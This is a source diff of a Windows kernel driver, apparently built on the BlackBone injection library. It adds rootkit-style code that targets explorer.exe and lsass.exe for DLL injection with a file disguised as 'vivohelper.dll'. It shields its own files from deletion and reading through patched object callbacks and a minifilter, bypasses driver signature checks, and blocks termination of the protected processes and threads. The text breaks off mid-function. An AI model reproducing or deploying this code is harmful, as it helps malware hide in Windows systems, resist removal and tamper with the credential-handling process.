@@ -3,24 +3,78 @@
 #include "Loader.h"
 #include "Utils.h"
 #include <Ntstrsafe.h>
+#include <ntddk.h>
+#include <string.h>
 
 #define DELAY_ONE_MICROSECOND (-10)
 #define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
-#define TARGET_PNAME_1 "lsass.exe"
-#define TARGET_PNAME_2 "explorer.exe"
-#define TARGET_SYS L"C:\\Users\\Administrator\\Desktop\\BlackBoneDrv.sys"
-#define TARGET_DLL_FOR_INJECT L"C:\\Users\\Administrator\\Desktop\\xjj.dll"
-#define TARGET_DLL_FOR_HOOK L"xjj.dll"
+#define TARGET_PNAME_1 "explorer.exe"
+#define TARGET_PNAME_2 "lsass.exe"
+#define TARGET_DLL_FOR_INJECT L"C:\\Windows\\vivohelper.dll"
+#define TARGET_SYS_TO_PROTECTED L"vivohelper.sys"
+#define TARGET_DLL_TO_PROTECTED L"vivohelper.dll"
 #define INJECT_SPLIT (60)
 #define INVALID_PID (-1)
+
+#define _FILE_PROTECTION_WAY_1_
+
+#ifdef _FILE_PROTECTION_WAY_1_
+#define DISTINCT_SAVEFILE_FROM_READ (0x0000009fL)
+#endif
+
 KEVENT kEvent;
 PVOID obHandle;
 NTKERNELAPI UCHAR* PsGetProcessImageFileName(IN PEPROCESS Process);
 NTKERNELAPI NTSTATUS PsLookupProcessByProcessId(HANDLE Id, PEPROCESS *Process);
 
+/* file protection : second way */
+#ifdef _FILE_PROTECTION_WAY_2_
+#include <fltKernel.h>
+#include <dontuse.h>
+#include <suppress.h>
+#include <ntddscsi.h>
 #include <ntddk.h>
-#include <string.h>
+#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "Not valid for kernel mode drivers")
+#endif
+/* file protection : second way ends */
 
+#define BYTE_PATTERN "%c%c%c%c%c%c%c%c %c%c%c%c%c%c%c%c %c%c%c%c%c%c%c%c %c%c%c%c%c%c%c%c"
+#define BYTE_BINARY(byte)  \
+  (byte & 0x80000000 ? '1' : '0'), \
+  (byte & 0x40000000 ? '1' : '0'), \
+  (byte & 0x20000000 ? '1' : '0'), \
+  (byte & 0x10000000 ? '1' : '0'), \
+  (byte & 0x08000000 ? '1' : '0'), \
+  (byte & 0x04000000 ? '1' : '0'), \
+  (byte & 0x02000000 ? '1' : '0'), \
+  (byte & 0x01000000 ? '1' : '0'), \
+  (byte & 0x800000 ? '1' : '0'), \
+  (byte & 0x400000 ? '1' : '0'), \
+  (byte & 0x200000 ? '1' : '0'), \
+  (byte & 0x100000 ? '1' : '0'), \
+  (byte & 0x080000 ? '1' : '0'), \
+  (byte & 0x040000 ? '1' : '0'), \
+  (byte & 0x020000 ? '1' : '0'), \
+  (byte & 0x010000 ? '1' : '0'), \
+  (byte & 0x8000 ? '1' : '0'), \
+  (byte & 0x4000 ? '1' : '0'), \
+  (byte & 0x2000 ? '1' : '0'), \
+  (byte & 0x1000 ? '1' : '0'), \
+  (byte & 0x0800 ? '1' : '0'), \
+  (byte & 0x0400 ? '1' : '0'), \
+  (byte & 0x0200 ? '1' : '0'), \
+  (byte & 0x0100 ? '1' : '0'), \
+  (byte & 0x80 ? '1' : '0'), \
+  (byte & 0x40 ? '1' : '0'), \
+  (byte & 0x20 ? '1' : '0'), \
+  (byte & 0x10 ? '1' : '0'), \
+  (byte & 0x08 ? '1' : '0'), \
+  (byte & 0x04 ? '1' : '0'), \
+  (byte & 0x02 ? '1' : '0'), \
+  (byte & 0x01 ? '1' : '0') 
+
+/* file protection : first way */
+#ifdef _FILE_PROTECTION_WAY_1_
 typedef struct _CALLBACK_ENTRY {
 	LIST_ENTRY CallbackList;
 	OB_OPERATION  Operations;
@@ -151,6 +205,662 @@ typedef struct _MY_OBJECT_TYPE                   // 12 elements, 0xD0 bytes (siz
 	/*0x0C0*/     struct _LIST_ENTRY CallbackList;          // 2 elements, 0x10 bytes (sizeof)
 }MY_OBJECT_TYPE, *PMY_OBJECT_TYPE;
 
+OB_PREOP_CALLBACK_STATUS preCall(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation)
+{
+	UNICODE_STRING DosName;
+	PFILE_OBJECT fileo = OperationInformation->Object;
+	HANDLE CurrentProcessId = PsGetCurrentProcessId();
+	UNREFERENCED_PARAMETER(RegistrationContext);
+	if (OperationInformation->ObjectType != *IoFileObjectType)
+		return OB_PREOP_SUCCESS;
+	//过滤无效指针
+	if (fileo->FileName.Buffer == NULL ||
+		!MmIsAddressValid(fileo->FileName.Buffer) ||
+		fileo->DeviceObject == NULL ||
+		!MmIsAddressValid(fileo->DeviceObject))
+		return OB_PREOP_SUCCESS;
+	//过滤无效路径
+	if (!_wcsicmp(fileo->FileName.Buffer, L"\\Endpoint") ||
+		!_wcsicmp(fileo->FileName.Buffer, L"?") ||
+		!_wcsicmp(fileo->FileName.Buffer, L"\\.\\.") ||
+		!_wcsicmp(fileo->FileName.Buffer, L"\\"))
+		return OB_PREOP_SUCCESS;
+	WCHAR pTempBuf[512] = { 0 };
+	WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
+	if (fileo->FileName.MaximumLength > 512)
+	{
+		pNonPageBuf = ExAllocatePool(NonPagedPool, fileo->FileName.MaximumLength);
+		pTemp = pNonPageBuf;
+	}
+	RtlCopyMemory(pTemp, fileo->FileName.Buffer, fileo->FileName.MaximumLength);
+	//_wcsupr(pTemp);
+	_wcslwr(pTemp);
+	if (
+		NULL != wcsstr(pTemp, TARGET_SYS_TO_PROTECTED) ||
+		NULL != wcsstr(pTemp, TARGET_DLL_TO_PROTECTED)
+		//wcsstr(_wcslwr(fileo->FileName.Buffer), TARGET_SYS_TO_PROTECTED) ||
+		//wcsstr(_wcslwr(fileo->FileName.Buffer), TARGET_DLL_TO_PROTECTED)		
+		)
+	{
+		if (NULL != pNonPageBuf)
+			ExFreePool(pNonPageBuf);
+		if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
+		{
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & DELETE) == DELETE) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~DELETE;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & READ_CONTROL) == READ_CONTROL) {
+				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & DISTINCT_SAVEFILE_FROM_READ) == DISTINCT_SAVEFILE_FROM_READ) {
+					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = 0;
+				}
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & WRITE_DAC) == WRITE_DAC) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~WRITE_DAC;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & WRITE_OWNER) == WRITE_OWNER) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~WRITE_OWNER;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & SYNCHRONIZE) == SYNCHRONIZE) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~SYNCHRONIZE;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & STANDARD_RIGHTS_REQUIRED) == STANDARD_RIGHTS_REQUIRED) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~STANDARD_RIGHTS_REQUIRED;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_READ) == GENERIC_READ) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_READ;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_WRITE) == GENERIC_WRITE) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_WRITE;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_EXECUTE;
+			}
+			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_ALL) == GENERIC_ALL) {
+				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_ALL;
+			}
+		}
+		if (OperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
+		{
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & DELETE) == DELETE) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~DELETE;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & READ_CONTROL) == READ_CONTROL) {
+				if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & DISTINCT_SAVEFILE_FROM_READ) == DISTINCT_SAVEFILE_FROM_READ) {
+					OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess = 0;
+				}
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & WRITE_DAC) == WRITE_DAC) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~WRITE_DAC;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & WRITE_OWNER) == WRITE_OWNER) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~WRITE_OWNER;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & SYNCHRONIZE) == SYNCHRONIZE) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~SYNCHRONIZE;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & STANDARD_RIGHTS_REQUIRED) == STANDARD_RIGHTS_REQUIRED) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~STANDARD_RIGHTS_REQUIRED;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_READ) == GENERIC_READ) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_READ;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_WRITE) == GENERIC_WRITE) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_WRITE;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_EXECUTE;
+			}
+			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_ALL) == GENERIC_ALL) {
+				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_ALL;
+			}
+		}
+	}
+	if (NULL != pNonPageBuf)
+		ExFreePool(pNonPageBuf);
+	RtlVolumeDeviceToDosName(fileo->DeviceObject, &DosName);
+	return OB_PREOP_SUCCESS;
+}
+
+VOID EnableObType(POBJECT_TYPE ObjectType)
+{
+	PMY_OBJECT_TYPE myobtype = (PMY_OBJECT_TYPE)ObjectType;
+	myobtype->TypeInfo.SupportsObjectCallbacks = 1;
+}
+#endif
+/* file protection : first way ends */
+
+/* file protection : second way */
+#ifdef _FILE_PROTECTION_WAY_2_
+NTSTATUS
+NPUnload
+(
+	__in FLT_FILTER_UNLOAD_FLAGS Flags
+);
+
+FLT_PREOP_CALLBACK_STATUS
+NPPreCreate
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+);
+
+FLT_POSTOP_CALLBACK_STATUS
+NPPostCreate
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+);
+
+FLT_PREOP_CALLBACK_STATUS
+NPPreSetInformation
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+);
+
+FLT_POSTOP_CALLBACK_STATUS
+NPPostSetInformation
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+);
+
+FLT_PREOP_CALLBACK_STATUS
+NPPreRead
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+);
+
+FLT_POSTOP_CALLBACK_STATUS
+NPPostRead
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+);
+
+FLT_PREOP_CALLBACK_STATUS
+NPPreWrite
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+);
+
+FLT_POSTOP_CALLBACK_STATUS
+NPPostWrite
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+);
+
+//Assign text sections for each routine.
+#ifdef ALLOC_PRAGMA
+#pragma alloc_text(PAGE, NPUnload)
+#pragma alloc_text(PAGE, NPPostCreate)
+#pragma alloc_text(PAGE, NPPostSetInformation)
+#pragma alloc_text(PAGE, NPPostRead)
+#pragma alloc_text(PAGE, NPPostWrite)
+#endif
+
+//operation registration
+const FLT_OPERATION_REGISTRATION Callbacks[] =
+{
+	{
+		IRP_MJ_CREATE,
+		0,
+		NPPreCreate,
+		NPPostCreate
+	},
+	{
+		IRP_MJ_SET_INFORMATION,
+		0,
+		NPPreSetInformation,
+		NPPostSetInformation
+	},
+	{
+		IRP_MJ_READ,
+		0,
+		NPPreRead,
+		NPPostRead
+	},
+	{
+		IRP_MJ_WRITE,
+		0,
+		NPPreWrite,
+		NPPostWrite
+	},
+	{
+		IRP_MJ_OPERATION_END
+	}
+};
+
+//This defines what we want to filter with FltMgr
+const FLT_REGISTRATION FilterRegistration =
+{
+	sizeof(FLT_REGISTRATION),         //  Size
+	FLT_REGISTRATION_VERSION,           //  Version
+	0,                                  //  Flags
+	NULL,                               //  Context
+	Callbacks,                          //  Operation callbacks
+	NPUnload,                           //  MiniFilterUnload
+	NULL,								//  InstanceSetup
+	NULL,								//  InstanceQueryTeardown
+	NULL,								//  InstanceTeardownStart
+	NULL,								//  InstanceTeardownComplete
+	NULL,                               //  GenerateFileName
+	NULL,                               //  GenerateDestinationFileName
+	NULL                                //  NormalizeNameComponent
+};
+
+PFLT_FILTER g_pFilterHandle = NULL;
+PFLT_PORT 	g_pServerPort = NULL;
+PFLT_PORT 	g_pClientPort = NULL;
+
+NTSTATUS NPUnload
+(
+	__in FLT_FILTER_UNLOAD_FLAGS Flags
+)
+{
+	UNREFERENCED_PARAMETER(Flags);
+	PAGED_CODE();
+	FltUnregisterFilter(g_pFilterHandle);
+	DbgPrint("[MiniFilter][DriverUnload]\n");
+	return STATUS_SUCCESS;
+}
+
+FLT_POSTOP_CALLBACK_STATUS NPPostCreate
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+)
+{
+	return FLT_POSTOP_FINISHED_PROCESSING;
+}
+
+FLT_PREOP_CALLBACK_STATUS NPPreCreate
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+)
+{
+	UNREFERENCED_PARAMETER(FltObjects);
+	UNREFERENCED_PARAMETER(CompletionContext);
+	PAGED_CODE();
+	{
+		UCHAR MajorFunction = 0;
+		ULONG Options = 0;
+		PFLT_FILE_NAME_INFORMATION nameInfo;
+		MajorFunction = Data->Iopb->MajorFunction;
+		Options = Data->Iopb->Parameters.Create.Options;
+		//如果是IRP_MJ_CREATE，且选项是FILE_DELETE_ON_CLOSE，并且能成功获得文件名信息
+		if (IRP_MJ_CREATE == MajorFunction && FILE_DELETE_ON_CLOSE == Options &&
+			NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
+		{
+			//如果解析文件信息成功
+			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
+			{
+				WCHAR pTempBuf[512] = { 0 };
+				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
+				if (nameInfo->Name.MaximumLength > 512)
+				{
+					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
+					pTemp = pNonPageBuf;
+				}
+				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
+				DbgPrint("[MiniFilter][IRP_MJ_CREATE]%wZ", &nameInfo->Name);
+				_wcsupr(pTemp);
+				if (NULL != wcsstr(pTemp, L"README.TXT"))  // 检查是不是要保护的文件
+				{
+					//DbgPrint( "\r\nIn NPPreCreate(), FilePath{%wZ} is forbided.", &nameInfo->Name );
+					if (NULL != pNonPageBuf)
+						ExFreePool(pNonPageBuf);
+					FltReleaseFileNameInformation(nameInfo);
+					return FLT_PREOP_COMPLETE;
+				}
+				if (NULL != pNonPageBuf)
+					ExFreePool(pNonPageBuf);
+			}
+			FltReleaseFileNameInformation(nameInfo);
+		}
+	}
+	return FLT_PREOP_SUCCESS_NO_CALLBACK;
+}
+
+FLT_POSTOP_CALLBACK_STATUS NPPostSetInformation
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+)
+{
+	return FLT_POSTOP_FINISHED_PROCESSING;
+}
+
+FLT_PREOP_CALLBACK_STATUS NPPreSetInformation
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+)
+{
+	UNREFERENCED_PARAMETER(FltObjects);
+	UNREFERENCED_PARAMETER(CompletionContext);
+	PAGED_CODE();
+	{
+		UCHAR MajorFunction = 0;
+		PFLT_FILE_NAME_INFORMATION nameInfo;
+		MajorFunction = Data->Iopb->MajorFunction;
+		//如果操作是IRP_MJ_SET_INFORMATION且成功获得文件名信息
+		if (IRP_MJ_SET_INFORMATION == MajorFunction &&
+			NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
+		{
+			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
+			{
+				WCHAR pTempBuf[512] = { 0 };
+				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
+				if (nameInfo->Name.MaximumLength > 512)
+				{
+					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
+					pTemp = pNonPageBuf;
+				}
+				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
+				DbgPrint("[MiniFilter][IRP_MJ_SET_INFORMATION]%wZ", &nameInfo->Name);
+				_wcsupr(pTemp);
+				if (NULL != wcsstr(pTemp, L"README.TXT"))  // 检查是不是要保护的文件
+				{
+					//DbgPrint( "\r\nIn NPPreSetInformation(), FilePath{%wZ} is forbided.", &nameInfo->Name );
+					if (NULL != pNonPageBuf)
+						ExFreePool(pNonPageBuf);
+					FltReleaseFileNameInformation(nameInfo);
+					return FLT_PREOP_DISALLOW_FASTIO;
+				}
+				if (NULL != pNonPageBuf)
+					ExFreePool(pNonPageBuf);
+			}
+			FltReleaseFileNameInformation(nameInfo);
+		}
+	}
+	return FLT_PREOP_SUCCESS_NO_CALLBACK;
+}
+
+FLT_POSTOP_CALLBACK_STATUS NPPostRead
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+)
+{
+	return FLT_POSTOP_FINISHED_PROCESSING;
+}
+
+FLT_PREOP_CALLBACK_STATUS NPPreRead
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+)
+{
+	UNREFERENCED_PARAMETER(FltObjects);
+	UNREFERENCED_PARAMETER(CompletionContext);
+	PAGED_CODE();
+	{
+		PFLT_FILE_NAME_INFORMATION nameInfo;
+		//直接获得文件名并检查
+		if (NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
+		{
+			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
+			{
+				WCHAR pTempBuf[512] = { 0 };
+				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
+				if (nameInfo->Name.MaximumLength > 512)
+				{
+					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
+					pTemp = pNonPageBuf;
+				}
+				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
+				DbgPrint("[MiniFilter][IRP_MJ_READ]%wZ", &nameInfo->Name);
+				/*_wcsupr( pTemp );
+				if( NULL != wcsstr( pTemp, L"README.TXT" ) )  // 检查是不是要保护的文件
+				{
+				//DbgPrint( "\r\nIn NPPreWrite(), FilePath{%wZ} is forbided.", &nameInfo->Name );
+				if( NULL != pNonPageBuf )
+				ExFreePool( pNonPageBuf );
+				FltReleaseFileNameInformation( nameInfo );
+				return FLT_PREOP_DISALLOW_FASTIO;
+				}*/
+				if (NULL != pNonPageBuf)
+					ExFreePool(pNonPageBuf);
+			}
+			FltReleaseFileNameInformation(nameInfo);
+		}
+	}
+	return FLT_PREOP_SUCCESS_NO_CALLBACK;
+}
+
+FLT_POSTOP_CALLBACK_STATUS NPPostWrite
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__in_opt PVOID CompletionContext,
+	__in FLT_POST_OPERATION_FLAGS Flags
+)
+{
+	return FLT_POSTOP_FINISHED_PROCESSING;
+}
+
+FLT_PREOP_CALLBACK_STATUS NPPreWrite
+(
+	__inout PFLT_CALLBACK_DATA Data,
+	__in PCFLT_RELATED_OBJECTS FltObjects,
+	__deref_out_opt PVOID *CompletionContext
+)
+{
+	UNREFERENCED_PARAMETER(FltObjects);
+	UNREFERENCED_PARAMETER(CompletionContext);
+	PAGED_CODE();
+	{
+		PFLT_FILE_NAME_INFORMATION nameInfo;
+		//直接获得文件名并检查
+		if (NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
+		{
+			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
+			{
+				WCHAR pTempBuf[512] = { 0 };
+				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
+				if (nameInfo->Name.MaximumLength > 512)
+				{
+					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
+					pTemp = pNonPageBuf;
+				}
+				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
+				DbgPrint("[MiniFilter][IRP_MJ_WRITE]%wZ", &nameInfo->Name);
+				_wcsupr(pTemp);
+				if (NULL != wcsstr(pTemp, L"README.TXT"))  // 检查是不是要保护的文件
+				{
+					//DbgPrint( "\r\nIn NPPreWrite(), FilePath{%wZ} is forbided.", &nameInfo->Name );
+					if (NULL != pNonPageBuf)
+						ExFreePool(pNonPageBuf);
+					FltReleaseFileNameInformation(nameInfo);
+					return FLT_PREOP_DISALLOW_FASTIO;
+				}
+				if (NULL != pNonPageBuf)
+					ExFreePool(pNonPageBuf);
+			}
+			FltReleaseFileNameInformation(nameInfo);
+		}
+	}
+	return FLT_PREOP_SUCCESS_NO_CALLBACK;
+}
+#endif
+/* file protection : second way ends */
+
+/* process protection */
+
+NTKERNELAPI PEPROCESS IoThreadToProcess(PETHREAD Thread);
+NTKERNELAPI char* PsGetProcessImageFileName(PEPROCESS Process);
+
+void BypassCheckSign(PDRIVER_OBJECT pDriverObj)
+{
+	//STRUCT FOR WIN64
+	typedef struct _LDR_DATA                         			// 24 elements, 0xE0 bytes (sizeof)
+	{
+		struct _LIST_ENTRY InLoadOrderLinks;                     // 2 elements, 0x10 bytes (sizeof)
+		struct _LIST_ENTRY InMemoryOrderLinks;                   // 2 elements, 0x10 bytes (sizeof)
+		struct _LIST_ENTRY InInitializationOrderLinks;           // 2 elements, 0x10 bytes (sizeof)
+		VOID*        DllBase;
+		VOID*        EntryPoint;
+		ULONG32      SizeOfImage;
+		UINT8        _PADDING0_[0x4];
+		struct _UNICODE_STRING FullDllName;                      // 3 elements, 0x10 bytes (sizeof)
+		struct _UNICODE_STRING BaseDllName;                      // 3 elements, 0x10 bytes (sizeof)
+		ULONG32      Flags;
+	}LDR_DATA, *PLDR_DATA;
+	PLDR_DATA ldr;
+	ldr = (PLDR_DATA)(pDriverObj->DriverSection);
+	ldr->Flags |= 0x20;
+}
+
+BOOLEAN IsProtectedProcessName(PEPROCESS eprocess)
+{
+	char *Name = PsGetProcessImageFileName(eprocess);
+	if (
+		(!_stricmp(TARGET_PNAME_1, Name)) ||
+		(!_stricmp(TARGET_PNAME_2, Name))
+		)
+		return TRUE;
+	else
+		return FALSE;
+}
+
+PVOID obHandle1 = NULL, obHandle2 = NULL;
+
+OB_PREOP_CALLBACK_STATUS preCall1(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION pOperationInformation)
+{
+#define PROCESS_TERMINATE 0x1
+	HANDLE pid;
+	if (pOperationInformation->ObjectType != *PsProcessType)
+		goto exit_sub;
+	pid = PsGetProcessId((PEPROCESS)pOperationInformation->Object);
+	UNREFERENCED_PARAMETER(RegistrationContext);
+	if (IsProtectedProcessName((PEPROCESS)pOperationInformation->Object))
+	{
+		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
+		{
+			//pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess=0;
+			if ((pOperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_TERMINATE) == PROCESS_TERMINATE)
+			{
+				pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
+			}
+		}
+		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
+		{
+			//pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess=0;
+			if ((pOperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & PROCESS_TERMINATE) == PROCESS_TERMINATE)
+			{
+				pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~PROCESS_TERMINATE;
+			}
+		}
+	}
+exit_sub:
+	return OB_PREOP_SUCCESS;
+}
+
+OB_PREOP_CALLBACK_STATUS preCall2(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION pOperationInformation)
+{
+#define THREAD_TERMINATE2 0x1
+	PEPROCESS ep;
+	PETHREAD et;
+	HANDLE pid;
+	if (pOperationInformation->ObjectType != *PsThreadType)
+		goto exit_sub;
+	et = (PETHREAD)pOperationInformation->Object;
+	ep = IoThreadToProcess(et);
+	pid = PsGetProcessId(ep);
+	UNREFERENCED_PARAMETER(RegistrationContext);
+	if (IsProtectedProcessName(ep))
+	{
+		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
+		{
+			//pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess=0;
+			if ((pOperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & THREAD_TERMINATE2) == THREAD_TERMINATE2)
+			{
+				pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE2;
+			}
+		}
+		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
+		{
+			//pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess=0;
+			if ((pOperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & THREAD_TERMINATE2) == THREAD_TERMINATE2)
+			{
+				pOperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE2;
+			}
+		}
+	}
+exit_sub:
+	return OB_PREOP_SUCCESS;
+}
+
+NTSTATUS ObProtectProcess(BOOLEAN Enable)
+{
+	if (Enable == TRUE)
+	{
+		NTSTATUS obst1 = 0, obst2 = 0;
+		OB_CALLBACK_REGISTRATION obReg, obReg2;
+		OB_OPERATION_REGISTRATION opReg, opReg2;
+		//reg ob callback 1
+		memset(&obReg, 0, sizeof(obReg));
+		obReg.Version = ObGetFilterVersion();
+		obReg.OperationRegistrationCount = 1;
+		obReg.RegistrationContext = NULL;
+		RtlInitUnicodeString(&obReg.Altitude, L"321124");
+		obReg.OperationRegistration = &opReg;
+		memset(&opReg, 0, sizeof(opReg));
+		opReg.ObjectType = PsProcessType;
+		opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
